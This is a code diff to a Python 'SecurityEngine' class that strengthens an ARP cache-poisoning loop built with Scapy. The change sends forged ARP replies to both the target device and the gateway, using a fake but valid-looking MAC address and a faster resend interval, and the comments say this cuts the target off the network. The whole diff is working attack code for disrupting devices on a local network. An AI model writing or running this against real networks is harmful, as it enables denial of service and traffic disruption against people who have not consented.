@@ -59,28 +59,40 @@ class SecurityEngine:
             return target_ip in self.blocking_tasks
 
     def _disruption_loop(self, target_ip, target_mac, stop_event):
-        """Periodic ARP poisoning loop."""
-        # Use a non-existent MAC for the gateway to disrupt the path
-        FAKE_MAC = "00:00:00:00:00:00"
+        """Periodic ARP poisoning loop (Bidirectional)."""
+        # Using a non-existent but valid-looking unicast MAC
+        # 00:00:00:00:00:00 is sometimes ignored as invalid.
+        FAKE_MAC = "00:0c:29:ab:cd:ef" 
         
-        logger.info(f"Disruption loop started for {target_ip}")
+        logger.info(f"Disruption loop started for {target_ip} using gateway {self.gateway_ip}")
+        
+        # Try to find gateway MAC if we don't have it (optional but better for unblocking)
+        gateway_mac = "ff:ff:ff:ff:ff:ff" # Fallback to broadcast for poisoning
+        
         while not stop_event.is_set():
             try:
-                # Tell the target that the gateway is at FAKE_MAC
-                pkt = ARP(
+                # 1. Poison Target: Tell target that Gateway is at FAKE_MAC
+                # This stops target from sending data TO the gateway
+                pkt_to_target = ARP(
                     op=2, 
                     pdst=target_ip, 
                     hwdst=target_mac, 
                     psrc=self.gateway_ip, 
                     hwsrc=FAKE_MAC
                 )
-                send(pkt, iface=self.interface, verbose=False)
+                send(pkt_to_target, iface=self.interface, verbose=False)
                 
-                # We can also tell the gateway that the target is at FAKE_MAC
-                # (Bidirectional disruption)
-                # But usually disrupting the target is enough for "no internet"
+                # 2. Poison Gateway: Tell Gateway that Target is at FAKE_MAC
+                # This stops gateway from sending data TO the target
+                pkt_to_gw = ARP(
+                    op=2,
+                    pdst=self.gateway_ip,
+                    psrc=target_ip,
+                    hwsrc=FAKE_MAC
+                )
+                send(pkt_to_gw, iface=self.interface, verbose=False)
                 
-                time.sleep(2) # Send every 2 seconds to keep cache poisoned
+                time.sleep(1.5) # Slightly faster interval for persistence
             except Exception as e:
                 logger.error(f"Disruption Error for {target_ip}: {e}")
                 break
